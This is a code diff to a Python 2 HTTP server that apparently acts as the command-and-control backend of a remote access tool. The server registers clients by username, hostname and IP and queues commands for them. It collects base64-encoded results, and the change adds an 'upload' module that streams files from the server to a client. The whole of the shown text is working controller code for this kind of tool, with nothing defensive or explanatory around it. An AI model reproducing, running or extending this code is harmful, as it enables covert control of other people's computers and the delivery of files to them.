@@ -6,7 +6,7 @@ Provides only the communication layer, all other functionality is handled by mod
 """
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "1.0.0"
+__version__ = "1.1.0"
 
 import threading
 import sqlite3
@@ -20,6 +20,7 @@ import fnmatch
 import imp
 import base64
 import textwrap
+import shutil
 from sys import exit
 
 BANNER = """\
@@ -100,13 +101,14 @@ class ClientController(BaseHTTPRequestHandler):
     _model = None
     _modules = None
 
-    def do_POST(self):
-        """Handles POST requests."""
-        data = str(self.rfile.read(int(self.headers.getheader("Content-Length"))))
-
+    def send_headers(self):
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
+
+    def do_POST(self):
+        """Handles POST requests."""
+        data = str(self.rfile.read(int(self.headers.getheader("Content-Length"))))
 
         if self.path == "/api/get_command":
             # Command requests
@@ -123,6 +125,7 @@ class ClientController(BaseHTTPRequestHandler):
                 print MESSAGE_INFO + "New client \"{0}@{1}\" connected!".format(username, hostname)
 
                 self._model.add_client(Client(client_id, username, hostname, remote_ip, path, time.time()))
+                self.send_headers()
                 self.wfile.write("You dun goofed.")
             else:
                 # Update the client's session (path and last_online).
@@ -133,19 +136,46 @@ class ClientController(BaseHTTPRequestHandler):
 
                 if command:
                     self._model.remove_command(command)
-                    self.wfile.write("{0}|{1}|{2}".format(
-                        command.type, command.module_name, command.command
-                    ))
 
                     # Special modules which need the server to do extra stuff.
                     if command.module_name in ["update_client", "remove_client"]:
                         self._model.remove_client(client_id)
+
+                        self.send_headers()
+                        self.wfile.write("{0}|{1}|{2}".format(
+                            command.type, command.module_name, command.command
+                        ))
+                    elif command.module_name == "upload":
+                        file_path = base64.b64decode(command.command).split(":")[0].replace("\n", "")
+                        file_name = os.path.basename(file_path)
+
+                        print "\n" + MESSAGE_INFO + "Sending file to client..."
+
+                        with open(file_path, "rb") as input_file:
+                            file_size = os.fstat(input_file.fileno())
+
+                            self.send_response(200)
+                            self.send_header("Content-Type", "application/octet-stream")
+                            self.send_header("Content-Disposition", "attachment; filename=\"{0}\"".format(file_name))
+                            self.send_header("Content-Length", str(file_size.st_size))
+                            self.send_header("X-Upload-Module", command.command)
+                            self.end_headers()
+
+                            shutil.copyfileobj(input_file, self.wfile)
+                    else:
+                        self.send_headers()
+                        self.wfile.write("{0}|{1}|{2}".format(
+                            command.type, command.module_name, command.command
+                        ))
                 else:
                     # Client has no pending commands.
+                    self.send_headers()
                     self.wfile.write("")
         elif self.path == "/api/response":
             # Command responses
             full_response = base64.b64decode(unquote_plus(data.replace("output=", "", 1)))
+
+            self.send_headers()
 
             try:
                 response = base64.b64decode(full_response.split("|")[2])
@@ -170,9 +200,7 @@ class ClientController(BaseHTTPRequestHandler):
                 print "\n" + full_response
 
     def do_GET(self):
-        self.send_response(200)
-        self.send_header("Content-type", "text/html")
-        self.end_headers()
+        self.send_headers()
 
         if self.path == "/api/get_ca":
             # Send back our certificate authority.
